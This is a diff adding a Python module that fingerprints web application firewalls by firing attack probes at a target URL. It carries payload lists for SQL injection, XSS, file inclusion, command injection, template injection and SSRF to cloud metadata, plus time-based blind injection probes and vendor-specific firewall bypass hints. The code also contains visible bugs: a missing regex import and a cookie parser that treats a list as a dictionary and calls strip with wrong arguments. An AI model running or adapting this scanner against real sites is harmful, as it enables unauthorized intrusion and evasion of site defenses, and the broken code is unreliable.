@@ -1,0 +1,646 @@
+# utils/waf_fingerprinter.py
+
+import asyncio
+import aiohttp
+import time
+from dataclasses import dataclass, field
+from enum import Enum
+from typing import Optional
+from urllib.parse import urlparse, urlencode, quote
+
+
+class WAFVendor(Enum):
+    CLOUDFLARE = "Cloudflare"
+    AKAMAI = "Akamai"
+    IMPERVA = "Imperva / Incapsula"
+    AWS_WAF = "AWS WAF / CloudFront"
+    AZURE_FRONT_DOOR = "Azure Front Door / WAF"
+    FASTLY = "Fastly"
+    F5_BIG_IP = "F5 BIG-IP ASM"
+    BARRACUDA = "Barracuda WAF"
+    FORTIWEB = "FortiWeb"
+    SUCURI = "Sucuri"
+    WORDFENCE = "Wordfence"
+    MODSECURITY = "ModSecurity"
+    NGINX_WAF = "NGINX App Protect"
+    UNKNOWN_WAF = "Unknown WAF"
+    NO_WAF = "No WAF Detected"
+
+
+class ConfidenceLevel(Enum):
+    HIGH = "high"
+    MEDIUM = "medium"
+    LOW = "low"
+
+
+@dataclass
+class WAFSignal:
+    source: str
+    key: str
+    value: str
+    vendor_hint: WAFVendor
+    confidence: ConfidenceLevel
+    notes: str = ""
+
+
+@dataclass
+class ProbeResult:
+    probe_name: str
+    payload: str
+    status_code: int
+    response_headers: dict
+    body_snippet: str
+    latency_ms: float
+    blocked: bool
+    block_signals: list[WAFSignal] = field(default_factory=list)
+
+
+@dataclass
+class WAFFingerprint:
+    target_url: str
+    vendor: WAFVendor
+    confidence: ConfidenceLevel
+    signals: list[WAFSignal] = field(default_factory=list)
+    probe_results: list[ProbeResult] = field(default_factory=list)
+    baseline_status: int = 0
+    bypass_hints: list[str] = field(default_factory=list)
+    duration_seconds: float = 0.0
+
+
+HEADER_SIGNATURES: dict[str, list[tuple[str, WAFVendor, ConfidenceLevel]]] = {
+    "cf-ray": [("*", WAFVendor.CLOUDFLARE, ConfidenceLevel.HIGH)],
+    "cf-cache-status": [("*", WAFVendor.CLOUDFLARE, ConfidenceLevel.HIGH)],
+    "cf-mitigated": [("*", WAFVendor.CLOUDFLARE, ConfidenceLevel.HIGH)],
+    "x-sucuri-id": [("*", WAFVendor.SUCURI, ConfidenceLevel.HIGH)],
+    "x-sucuri-cache": [("*", WAFVendor.SUCURI, ConfidenceLevel.HIGH)],
+    "x-iinfo": [("*", WAFVendor.IMPERVA, ConfidenceLevel.HIGH)],
+    "x-cdn": [("imperva", WAFVendor.IMPERVA, ConfidenceLevel.HIGH)],
+    "incap-ses": [("*", WAFVendor.IMPERVA, ConfidenceLevel.HIGH)],
+    "visid_incap": [("*", WAFVendor.IMPERVA, ConfidenceLevel.HIGH)],
+    "x-amz-cf-id": [("*", WAFVendor.AWS_WAF, ConfidenceLevel.HIGH)],
+    "x-amz-cf-pop": [("*", WAFVendor.AWS_WAF, ConfidenceLevel.HIGH)],
+    "x-azure-ref": [("*", WAFVendor.AZURE_FRONT_DOOR, ConfidenceLevel.HIGH)],
+    "x-fd-healthprobe": [("*", WAFVendor.AZURE_FRONT_DOOR, ConfidenceLevel.MEDIUM)],
+    "x-akamai-transformed": [("*", WAFVendor.AKAMAI, ConfidenceLevel.HIGH)],
+    "akamai-origin-hop": [("*", WAFVendor.AKAMAI, ConfidenceLevel.HIGH)],
+    "x-check-cacheable": [("*", WAFVendor.AKAMAI, ConfidenceLevel.MEDIUM)],
+    "x-fastly-request-id": [("*", WAFVendor.FASTLY, ConfidenceLevel.HIGH)],
+    "fastly-restarts": [("*", WAFVendor.FASTLY, ConfidenceLevel.HIGH)],
+    "x-fw-server": [("*", WAFVendor.FORTIWEB, ConfidenceLevel.HIGH)],
+    "x-fw-debug": [("*", WAFVendor.FORTIWEB, ConfidenceLevel.MEDIUM)],
+    "server": [
+        ("cloudflare", WAFVendor.CLOUDFLARE, ConfidenceLevel.HIGH),
+        ("awselb", WAFVendor.AWS_WAF, ConfidenceLevel.MEDIUM),
+        ("amazons3", WAFVendor.AWS_WAF, ConfidenceLevel.LOW),
+        ("akamaighost", WAFVendor.AKAMAI, ConfidenceLevel.HIGH),
+        ("nginx", WAFVendor.NGINX_WAF, ConfidenceLevel.LOW),
+        ("bigip", WAFVendor.F5_BIG_IP, ConfidenceLevel.HIGH),
+        ("f5", WAFVendor.F5_BIG_IP, ConfidenceLevel.MEDIUM),
+        ("fortigate", WAFVendor.FORTIWEB, ConfidenceLevel.HIGH),
+        ("sucuri", WAFVendor.SUCURI, ConfidenceLevel.HIGH),
+    ],
+    "x-powered-by": [
+        ("mod_security", WAFVendor.MODSECURITY, ConfidenceLevel.HIGH),
+    ],
+    "x-content-security-policy-report-only": [
+        ("*", WAFVendor.UNKNOWN_WAF, ConfidenceLevel.LOW)
+    ],
+}
+
+COOKIE_SIGNATURES: dict[str, WAFVendor] = {
+    "cf_clearance": WAFVendor.CLOUDFLARE,
+    "__cfduid": WAFVendor.CLOUDFLARE,
+    "incap_ses": WAFVendor.IMPERVA,
+    "visid_incap": WAFVendor.IMPERVA,
+    "ak_bmsc": WAFVendor.AKAMAI,
+    "bm_sz": WAFVendor.AKAMAI,
+    "_abck": WAFVendor.AKAMAI,
+    "awsalb": WAFVendor.AWS_WAF,
+    "awsalbcors": WAFVendor.AWS_WAF,
+    "sucuri_cloudproxy": WAFVendor.SUCURI,
+    "barracuda_": WAFVendor.BARRACUDA,
+    "barra_counter_session": WAFVendor.BARRACUDA,
+}
+
+BODY_SIGNATURES: list[tuple[str, WAFVendor, ConfidenceLevel]] = [
+    (r"cloudflare", WAFVendor.CLOUDFLARE, ConfidenceLevel.MEDIUM),
+    (r"ray id:", WAFVendor.CLOUDFLARE, ConfidenceLevel.HIGH),
+    (r"attention required.*cloudflare", WAFVendor.CLOUDFLARE, ConfidenceLevel.HIGH),
+    (r"incapsula incident id", WAFVendor.IMPERVA, ConfidenceLevel.HIGH),
+    (r"this request has been blocked by imperva", WAFVendor.IMPERVA, ConfidenceLevel.HIGH),
+    (r"protected by incapsula", WAFVendor.IMPERVA, ConfidenceLevel.HIGH),
+    (r"aws cloudfront", WAFVendor.AWS_WAF, ConfidenceLevel.MEDIUM),
+    (r"generated by cloudfront", WAFVendor.AWS_WAF, ConfidenceLevel.HIGH),
+    (r"request blocked.*aws", WAFVendor.AWS_WAF, ConfidenceLevel.MEDIUM),
+    (r"akamai.*reference", WAFVendor.AKAMAI, ConfidenceLevel.HIGH),
+    (r"the requested url was rejected.*akamai", WAFVendor.AKAMAI, ConfidenceLevel.HIGH),
+    (r"sucuri website firewall", WAFVendor.SUCURI, ConfidenceLevel.HIGH),
+    (r"you are not allowed to access", WAFVendor.SUCURI, ConfidenceLevel.MEDIUM),
+    (r"wordfence security", WAFVendor.WORDFENCE, ConfidenceLevel.HIGH),
+    (r"generated by wordfence", WAFVendor.WORDFENCE, ConfidenceLevel.HIGH),
+    (r"modsecurity", WAFVendor.MODSECURITY, ConfidenceLevel.HIGH),
+    (r"mod_security", WAFVendor.MODSECURITY, ConfidenceLevel.HIGH),
+    (r"406 not acceptable.*mod", WAFVendor.MODSECURITY, ConfidenceLevel.MEDIUM),
+    (r"f5 networks", WAFVendor.F5_BIG_IP, ConfidenceLevel.HIGH),
+    (r"the requested url was rejected.*f5", WAFVendor.F5_BIG_IP, ConfidenceLevel.HIGH),
+    (r"fortigate application control", WAFVendor.FORTIWEB, ConfidenceLevel.HIGH),
+    (r"fortigate.*blocked", WAFVendor.FORTIWEB, ConfidenceLevel.HIGH),
+    (r"barracuda networks", WAFVendor.BARRACUDA, ConfidenceLevel.HIGH),
+    (r"barracuda web application firewall", WAFVendor.BARRACUDA, ConfidenceLevel.HIGH),
+    (r"access denied.*nginx", WAFVendor.NGINX_WAF, ConfidenceLevel.LOW),
+]
+
+WAF_BYPASS_HINTS: dict[WAFVendor, list[str]] = {
+    WAFVendor.CLOUDFLARE: [
+        "Origin IP discovery via Shodan/Censys may expose direct backend",
+        "Try X-Forwarded-For: 127.0.0.1 header injection",
+        "Old Cloudflare IPs in certificate transparency logs",
+        "Try HTTP/1.0 requests — some CF rules only inspect HTTP/1.1+",
+        "Use chunked transfer encoding to evade body inspection",
+        "IPv6 addresses may bypass CF rules depending on config",
+    ],
+    WAFVendor.IMPERVA: [
+        "Incapsula leaks origin IP in X-Forwarded-For under certain configs",
+        "Try multipart/form-data encoding for POST payloads",
+        "Null byte injection: param=value%00<payload>",
+        "Try HPP (HTTP Parameter Pollution): param=clean&param=<payload>",
+        "Incapsula session cookie replay may allow extended crawling windows",
+    ],
+    WAFVendor.AWS_WAF: [
+        "AWS WAF rules are regex-based — try case variation and encoding",
+        "Large body requests may skip inspection depending on rule config",
+        "JSON body injection: WAF may not parse deeply nested JSON",
+        "Try CORS preflight requests to map allowed methods",
+        "CloudFront geo-restrictions may be bypassable via X-Forwarded-For",
+    ],
+    WAFVendor.AKAMAI: [
+        "Akamai Pragma headers may reveal internal config: Pragma: akamai-x-get-request-id",
+        "Try Akamai debug headers: Pragma: akamai-x-cache-on, akamai-x-cache-remote-on",
+        "SureRoute IP ranges in BGP data may expose origin",
+        "Slow-rate HTTP attacks may evade Akamai Bot Manager",
+    ],
+    WAFVendor.MODSECURITY: [
+        "ModSecurity in detection-only mode won't block, only log",
+        "Try /*!50000UNION*/ MySQL version comment bypass",
+        "HPP bypass: id=1&id=UNION SELECT",
+        "Try alternate encodings: %u0027 for single quote",
+        "Content-Type mismatch: send JSON body with form Content-Type",
+        "ModSecurity anomaly scoring — combine low-score payloads",
+    ],
+    WAFVendor.F5_BIG_IP: [
+        "BIG-IP ASM leaks internal IP in X-Forwarded-For when misconfigured",
+        "BIG-IP iRule logic may be bypassable via unusual HTTP methods",
+        "Try CRLF injection in headers to split response",
+        "Cookie manipulation — BIG-IP session cookies may reveal pool members",
+    ],
+    WAFVendor.SUCURI: [
+        "Sucuri CloudProxy origin IP often discoverable via DNS history",
+        "Try direct IP access with Host header set to target domain",
+        "Sucuri may not inspect WebSocket upgrade requests",
+    ],
+    WAFVendor.UNKNOWN_WAF: [
+        "Enumerate block page for WAF fingerprint clues",
+        "Try passive fingerprinting via timing differences",
+        "Test encoding variations: double URL encode, Unicode normalization",
+    ],
+    WAFVendor.NO_WAF: [
+        "No WAF detected — direct exploitation surface available",
+        "Check for application-level input filtering only",
+    ],
+}
+
+EVASION_PROBES: list[tuple[str, str]] = [
+    ("sqli_basic", "' OR '1'='1"),
+    ("sqli_union", "UNION SELECT NULL,NULL,NULL--"),
+    ("sqli_comment", "/*!50000SELECT*/1"),
+    ("sqli_encoded", "%27%20OR%20%271%27%3D%271"),
+    ("xss_basic", "<script>alert(1)</script>"),
+    ("xss_encoded", "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
+    ("xss_unicode", "\u003cscript\u003ealert(1)\u003c/script\u003e"),
+    ("xss_double_encoded", "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"),
+    ("lfi_basic", "../../etc/passwd"),
+    ("lfi_encoded", "..%2F..%2Fetc%2Fpasswd"),
+    ("lfi_double_encoded", "..%252F..%252Fetc%252Fpasswd"),
+    ("lfi_null_byte", "../../etc/passwd%00.jpg"),
+    ("rce_basic", "; cat /etc/passwd"),
+    ("rce_encoded", "%3B%20cat%20%2Fetc%2Fpasswd"),
+    ("rce_backtick", "`id`"),
+    ("rce_dollar", "$(id)"),
+    ("xxe_basic", "<?xml version='1.0'?><!DOCTYPE x[<!ENTITY y SYSTEM 'file:///etc/passwd'>]><x>&y;</x>"),
+    ("path_traversal", "....//....//etc/passwd"),
+    ("path_traversal_encoded", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
+    ("header_injection", "test\r\nX-Injected: true"),
+    ("ssti_basic", "{{7*7}}"),
+    ("ssti_jinja", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
+    ("nosqli_basic", "{'$gt': ''}"),
+    ("nosqli_operator", "' || '1'=='1"),
+    ("open_redirect", "//evil.com/%2F.."),
+    ("ssrf_basic", "http://169.254.169.254/latest/meta-data/"),
+    ("ssrf_encoded", "http%3A%2F%2F169.254.169.254"),
+]
+
+TIMING_PAYLOADS: list[tuple[str, str, float]] = [
+    ("sqli_sleep_mysql", "1' AND SLEEP(3)-- -", 3.0),
+    ("sqli_sleep_mssql", "1'; WAITFOR DELAY '0:0:3'--", 3.0),
+    ("sqli_sleep_pg", "1' AND pg_sleep(3)--", 3.0),
+    ("rce_sleep", "; sleep 3", 3.0),
+    ("ssti_sleep", "{{lipsum.__globals__.os.popen('sleep 3').read()}}", 3.0),
+]
+
+
+def _extract_cookies(response_headers: dict) -> dict[str, str]:
+    cookies = []
+    raw = response_headers.get("set-cookie", "")
+    if not raw:
+        return cookies
+    for part in raw.split(","):
+        kv = part.strip().split(";")[0].strip()
+        if "=" in kv:
+            k, v = kv.strip("=", 1)
+            cookies[k.strip().lower()] = v.strip()
+    return cookies
+    
+    
+def _scan_headers(resp_headers: dict) -> list[WAFSignal]:
+    signals = []
+    for header_key, header_val in resp_headers.items():
+        norm_key = header_key.lower().strip()
+        norm_val = header_val.lower().strip()
+        if norm_key in HEADER_SIGNATURES:
+            for match_val, vendor, confidence in HEADER_SIGNATURES[norm_key]:
+                if match_val == "*" or match_val in norm_val:
+                    signals.append(WAFSignal(
+                        source="response_header",
+                        key=header_key,
+                        value=header_val,
+                        vendor_hint=vendor,
+                        confidence=confidence,
+                    ))
+    return signals
+    
+    
+def _scan_cookies(resp_headers: dict) -> list[WAFSignal]:
+    signals = []
+    cookies = _extract_cookies(resp_headers)
+    for cookie_name, vendor in COOKIE_SIGNATURES.items():
+        for actual_name in cookies:
+            if cookie_name in actual_name:
+                signals.append(WAFSignal(
+                    source="cookie",
+                    key=actual_name,
+                    value=cookies[actual_name],
+                    vendor_hint=vendor,
+                    confidence=ConfidenceLevel.HIGH,
+                ))
+    return signals
+
+
+def _scan_body(body: bytes) -> list[WAFSignal]:
+    signals = []
+    try:
+        body_text = body.decode("utf-8", errors="ignore").lower()
+    except Exception:
+        return signals
+    for pattern, vendor, confidence in BODY_SIGNATURES:
+        if re.search(pattern, body_text, re.IGNORECASE):
+            signals.append(WAFSignal(
+                source="response_body",
+                key="body_pattern",
+                value=pattern,
+                vendor_hint=vendor,
+                confidence=confidence,
+            ))
+    return signals
+
+
+def _is_blocked(status: int, body: bytes, baseline_status: int) -> bool:
+    if status in (403, 406, 429, 503, 999):
+        return True
+    if baseline_status == 200 and status in (400, 401, 503):
+        return True
+    block_phrases = [
+        b"access denied", b"blocked", b"forbidden", b"request rejected",
+        b"security violation", b"threat detected", b"bot detected",
+        b"captcha", b"challenge", b"sorry, you have been blocked",
+        b"your ip has been blocked",
+    ]
+    body_lower = body.lower()
+    return any(phrase in body_lower for phrase in block_phrases)
+
+
+def _resolve_vendor(signals: list[WAFSignal]) -> tuple[WAFVendor, ConfidenceLevel]:
+    if not signals:
+        return WAFVendor.NO_WAF, ConfidenceLevel.HIGH
+
+    score: dict[WAFVendor, float] = {}
+    weight = {ConfidenceLevel.HIGH: 3.0, ConfidenceLevel.MEDIUM: 2.0, ConfidenceLevel.LOW: 1.0}
+
+    for sig in signals:
+        if sig.vendor_hint not in score:
+            score[sig.vendor_hint] = 0.0
+        score[sig.vendor_hint] += weight[sig.confidence]
+
+    if not score:
+        return WAFVendor.NO_WAF, ConfidenceLevel.HIGH
+
+    top_vendor = max(score, key=lambda v: score[v])
+    top_score = score[top_vendor]
+
+    if top_score >= 6.0:
+        return top_vendor, ConfidenceLevel.HIGH
+    elif top_score >= 3.0:
+        return top_vendor, ConfidenceLevel.MEDIUM
+    else:
+        if top_vendor == WAFVendor.NO_WAF:
+            return WAFVendor.NO_WAF, ConfidenceLevel.HIGH
+        return WAFVendor.UNKNOWN_WAF, ConfidenceLevel.LOW
+
+
+async def _baseline_request(
+    session: aiohttp.ClientSession, url: str, headers: dict
+) -> tuple[int, dict, bytes, float]:
+    t0 = time.monotonic()
+    try:
+        async with session.get(
+            url,
+            headers=headers,
+            allow_redirects=True,
+            timeout=aiohttp.ClientTimeout(total=12),
+            ssl=False,
+        ) as resp:
+            body = await resp.read()
+            return resp.status, dict(resp.headers), body, (time.monotonic() - t0) * 1000
+    except Exception as e:
+        return 0, {}, str(e).encode(), (time.monotonic() - t0) * 1000
+
+
+async def _evasion_probe(
+    session: aiohttp.ClientSession,
+    base_url: str,
+    probe_name: str,
+    payload: str,
+    headers: dict,
+    baseline_status: int,
+    semaphore: asyncio.Semaphore,
+    delay: float,
+) -> ProbeResult:
+    async with semaphore:
+        if delay > 0:
+            await asyncio.sleep(delay)
+        probe_url = f"{base_url}?q={quote(payload, safe='')}"
+        t0 = time.monotonic()
+        try:
+            async with session.get(
+                probe_url,
+                headers=headers,
+                allow_redirects=False,
+                timeout=aiohttp.ClientTimeout(total=10),
+                ssl=False,
+            ) as resp:
+                body = await resp.read()
+                latency = (time.monotonic() - t0) * 1000
+                status = resp.status
+                resp_headers = dict(resp.headers)
+        except asyncio.TimeoutError:
+            return ProbeResult(
+                probe_name=probe_name,
+                payload=payload,
+                status_code=0,
+                response_headers={},
+                body_snippet="TIMEOUT",
+                latency_ms=(time.monotonic() - t0) * 1000,
+                blocked=False,
+            )
+        except Exception as e:
+            return ProbeResult(
+                probe_name=probe_name,
+                payload=payload,
+                status_code=-1,
+                response_headers={},
+                body_snippet=str(e)[:200],
+                latency_ms=(time.monotonic() - t0) * 1000,
+                blocked=False,
+            )
+
+        blocked = _is_blocked(status, body, baseline_status)
+        signals = _scan_headers(resp_headers) + _scan_cookies(resp_headers) + _scan_body(body)
+
+        return ProbeResult(
+            probe_name=probe_name,
+            payload=payload,
+            status_code=status,
+            response_headers=resp_headers,
+            body_snippet=body[:512].decode("utf-8", errors="ignore"),
+            latency_ms=latency,
+            blocked=blocked,
+            block_signals=signals,
+        )
+        
+        
+async def _timing_probe(
+    session: aiohttp.ClientSession,
+    base_url: str,
+    probe_name: str,
+    payload: str,
+    expected_delay: float,
+    headers: dict,
+    semaphore: asyncio.Semaphore,
+) -> ProbeResult:
+    async with semaphore:
+        probe_url = f"{base_url}?id={quote(payload, safe='')}"
+        t0 = time.monotonic()
+        try:
+            async with session.get(
+                probe_url,
+                headers=headers,
+                allow_redirects=False,
+                timeout=aiohttp.ClientTimeout(total=expected_delay + 6),
+                ssl=False,
+            ) as resp:
+                body = await resp.read()
+                latency = (time.monotonic() - t0) * 1000
+                status = resp.status
+                resp_headers = dict(resp.headers)
+        except asyncio.TimeoutError:
+            latency = (time.monotonic() - t0) * 1000
+            return ProbeResult(
+                probe_name=f"timing:{probe_name}",
+                payload=payload,
+                status_code=0,
+                response_headers={},
+                body_snippet="TIMEOUT — possible blind SQLi/RCE",
+                latency_ms=latency,
+                blocked=False,
+                block_signals=[],
+            )
+        except Exception as e:
+            return ProbeResult(
+                probe_name=f"timing:{probe_name}",
+                payload=payload,
+                status_code=-1,
+                response_headers={},
+                body_snippet=str(e)[:200],
+                latency_ms=(time.monotonic() - t0) * 1000,
+                blocked=False,
+            )
+
+        triggered = latency >= (expected_delay * 1000 * 0.8)
+        blocked = _is_blocked(status, body, 200)
+        signals = _scan_headers(resp_headers) + _scan_body(body)
+
+        notes = ""
+        if triggered and not blocked:
+            notes = f"TIMING HIT — {latency:.0f}ms >= expected {expected_delay*1000:.0f}ms"
+
+        return ProbeResult(
+            probe_name=f"timing:{probe_name}",
+            payload=payload,
+            status_code=status,
+            response_headers=resp_headers,
+            body_snippet=body[:512].decode("utf-8", errors="ignore") + (" | " + notes if notes else ""),
+            latency_ms=latency,
+            blocked=blocked,
+            block_signals=signals,
+        )
+
+
+class WAFFingerprinter:
+    def __init__(
+        self,
+        concurrency: int = 15,
+        delay: float = 0.1,
+        run_timing_probes: bool = True,
+        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    ):
+        self.concurrency = concurrency
+        self.delay = delay
+        self.run_timing_probes = run_timing_probes
+        self.base_headers = {
+            "User-Agent": user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "close",
+        }
+
+    async def run(self, url: str) -> WAFFingerprint:
+        t_start = time.monotonic()
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            baseline_status, baseline_headers, baseline_body, _ = await _baseline_request(
+                session, url, self.base_headers
+            )
+
+            passive_signals = (
+                _scan_headers(baseline_headers)
+                + _scan_cookies(baseline_headers)
+                + _scan_body(baseline_body)
+            )
+
+            semaphore = asyncio.Semaphore(self.concurrency)
+            evasion_tasks = [
+                _evasion_probe(
+                    session, base_url, name, payload,
+                    self.base_headers, baseline_status, semaphore, self.delay
+                )
+                for name, payload in EVASION_PROBES
+            ]
+            evasion_results: list[ProbeResult] = await asyncio.gather(*evasion_tasks)
+
+            timing_results: list[ProbeResult] = []
+            if self.run_timing_probes:
+                timing_tasks = [
+                    _timing_probe(
+                        session, base_url, name, payload,
+                        expected_delay, self.base_headers, semaphore
+                    )
+                    for name, payload, expected_delay in TIMING_PROBES
+                ]
+                timing_results = await asyncio.gather(*timing_tasks)
+
+        all_probes = evasion_results + timing_results
+        all_signals = list(passive_signals)
+        for probe in all_probes:
+            all_signals.extend(probe.block_signals)
+
+        vendor, confidence = _resolve_vendor(all_signals)
+        bypass_hints = WAF_BYPASS_HINTS.get(vendor, WAF_BYPASS_HINTS[WAFVendor.UNKNOWN_WAF])
+
+        return WAFFingerprint(
+            target_url=url,
+            vendor=vendor,
+            confidence=confidence,
+            signals=all_signals,
+            probe_results=all_probes,
+            baseline_status=baseline_status,
+            bypass_hints=bypass_hints,
+            duration_seconds=time.monotonic() - t_start,
+        )
+
+    def run_sync(self, url: str) -> WAFFingerprint:
+        return asyncio.run(self.run(url))
+
+
+TIMING_PROBES = TIMING_PAYLOADS
+
+
+def serialize_fingerprint(fp: WAFFingerprint) -> dict:
+    def signal_to_dict(s: WAFSignal) -> dict:
+        return {
+            "source": s.source,
+            "key": s.key,
+            "value": s.value,
+            "vendor": s.vendor_hint.value,
+            "confidence": s.confidence.value,
+            "notes": s.notes,
+        }
+
+    def probe_to_dict(p: ProbeResult) -> dict:
+        return {
+            "probe": p.probe_name,
+            "payload": p.payload,
+            "status": p.status_code,
+            "latency_ms": round(p.latency_ms, 2),
+            "blocked": p.blocked,
+            "signals": [signal_to_dict(s) for s in p.block_signals],
+            "body_snippet": p.body_snippet[:300],
+        }
+
+    blocked_probes = [p for p in fp.probe_results if p.blocked]
+    passed_probes = [p for p in fp.probe_results if not p.blocked]
+
+    return {
+        "target": fp.target_url,
+        "vendor": fp.vendor.value,
+        "confidence": fp.confidence.value,
+        "baseline_status": fp.baseline_status,
+        "duration_seconds": round(fp.duration_seconds, 2),
+        "signal_count": len(fp.signals),
+        "signals": [signal_to_dict(s) for s in fp.signals],
+        "bypass_hints": fp.bypass_hints,
+        "probe_summary": {
+            "total": len(fp.probe_results),
+            "blocked": len(blocked_probes),
+            "passed": len(passed_probes),
+            "block_rate": round(len(blocked_probes) / max(len(fp.probe_results), 1) * 100, 1),
+        },
+        "blocked_probes": [probe_to_dict(p) for p in blocked_probes],
+        "passed_probes": [probe_to_dict(p) for p in passed_probes],
+    }
+
+
+def run_waf_fingerprint(
+    url: str,
+    concurrency: int = 15,
+    delay: float = 0.1,
+    run_timing_probes: bool = True,
+) -> dict:
+    fp = WAFFingerprinter(
+        concurrency=concurrency,
+        delay=delay,
+        run_timing_probes=run_timing_probes,
+    )
+    result = fp.run_sync(url)
+    return serialize_fingerprint(result)
